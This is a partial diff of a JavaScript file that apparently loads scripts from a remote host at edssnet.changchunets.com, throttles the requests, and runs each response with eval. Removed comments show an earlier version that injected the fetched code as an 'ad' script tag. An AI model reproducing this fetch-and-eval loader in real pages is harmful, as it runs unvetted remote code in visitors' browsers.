@@ -14,14 +14,6 @@ const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js","https://
             }
         })
     }
-
-    //-------------------封装的渲染方法----------------------
-   //-------------------控制并发----------------------
-
-
-
-
-    
     const  bs = document.body.style.cssText
 
     function handleFetchQueue(input, max) {
@@ -52,14 +44,9 @@ const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js","https://
                 
                 
                      try {
-       
-                       //可能出错的代码
-                    //     b =  document.body.innerHTML
+  
                      h =  document.head.innerHTML
-                     
-                    //                     document.open()
-                    //   document.write("<script id='ad'>" + res + "<\/script>");
-                    //   document.close()
+       
                        eval(res)
                       setTimeout(function() {
                           const index = requestsQueue.findIndex(item=>item===im.url)
